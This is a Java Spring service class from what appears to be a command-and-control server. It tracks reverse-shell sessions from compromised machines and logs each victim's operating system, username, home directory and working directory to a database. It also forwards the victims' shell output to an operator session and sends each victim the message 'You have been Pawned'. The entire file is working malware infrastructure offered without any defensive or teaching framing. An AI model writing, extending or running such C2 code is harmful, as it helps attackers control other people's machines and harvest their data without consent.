package com.mtattab.c2cServer.service.impl.shell.management;

import com.mtattab.c2cServer.model.json.InitialConnectionMessageModel;
import com.mtattab.c2cServer.model.json.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.json.ReverseShellInfoInitialMessage;
import com.mtattab.c2cServer.model.entity.SessionLogEntity;
import com.mtattab.c2cServer.repository.SessionLogRepository;
import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.sql.Timestamp;
import java.time.LocalDateTime;

@Service
@Slf4j
public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientHandlerService {

    @Autowired
    ActiveSessionsObservable activeSessionsObservable;
    @Autowired
    SessionLogRepository sessionLogRepository;

    public void addActiveSession(WebSocketSession session, TextMessage message){
        if (!activeSessionsObservable.getActiveReverseShellSessions().contains(session)){
            activeSessionsObservable.addReverseShellSession(session);
            logSessionInDb(session, message);
        }
    }

    public void removeActiveSession(WebSocketSession session){
        activeSessionsObservable.removeReverseShellSession(session);
        logSessionOutInDb(session);

    }

    private void logSessionInDb(WebSocketSession session, TextMessage message){
        try {
            ReverseShellInfoInitialMessage initialInfoMessage = DataManipulationUtil.
                    jsonToObject(message.getPayload(), ReverseShellInfoInitialMessage.class);

            System.out.println(initialInfoMessage);

            SessionLogEntity logEntity=  SessionLogEntity.builder()
                    .sessionId(session.getId())
                    .sessionLocalAddress(session.getLocalAddress().toString())
                    .sessionRemoteAddress(session.getRemoteAddress().toString())
                    .sessionCreatedAt(Timestamp.valueOf(LocalDateTime.now()))
                    .hasFiles("N")
                    .build();


            if (initialInfoMessage != null){
                setUserInfoToTheLog(logEntity, initialInfoMessage);
            }

            sessionLogRepository.save(logEntity);




        }catch (Exception e){
            log.error("[-] exception occurred while saving session: {}",e.getMessage());
            e.printStackTrace();
        }
    }
    private void setUserInfoToTheLog(SessionLogEntity logEntity, ReverseShellInfoInitialMessage initialInfoMessage){
        logEntity.setOsName(initialInfoMessage.getOsName());
        logEntity.setOsVersion(initialInfoMessage.getOsVersion());
        logEntity.setOsArch(initialInfoMessage.getOsArch());
        logEntity.setUserName(initialInfoMessage.getUserName());
        logEntity.setUserHome(initialInfoMessage.getUserHome());
        logEntity.setUserCurrentWorkingDir(initialInfoMessage.getUserCurrentWorkingDir());
        logEntity.setUserLanguage(initialInfoMessage.getUserLanguage());
    }



    private void logSessionOutInDb(WebSocketSession session){
        try {
            sessionLogRepository.updateSessionToClosed(Timestamp.valueOf(LocalDateTime.now()), session.getId());
        }catch (Exception e){
            log.error("[-] exception occurred while removing session: {}",e.getMessage());
            e.printStackTrace();
        }
    }




    public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
        String clientMessage = message.getPayload();
//        ManagerCommunicationModel managerCommunicationModel= DataManipulationUtil.jsonToObject(clientMessage, ManagerCommunicationModel.class);

        // Handle the client's message (e.g., send a response back to the client)
        String responseMessage =  clientMessage;
        System.out.println(responseMessage);

        WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
        if (mangerSession!=null){


            SocketUtil.sendMessage(mangerSession, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .msg(responseMessage)
                            .slaveSessionId(session.getId())
                            .build()
                    )));
        }else {
            session.sendMessage(new TextMessage(responseMessage));

        }


//        if (managerCommunicationModel!= null){
//            System.out.println(managerCommunicationModel);
//
//        }

    }

    public void sendIntialMessage(WebSocketSession session){
        SocketUtil.sendMessage(session, new TextMessage(
                DataManipulationUtil.convertObjectToJson(InitialConnectionMessageModel.builder()
                        .sessionId(session.getId())
                        .initialMessage("You have been Pawned")
                        .build())

        ));
    }


}
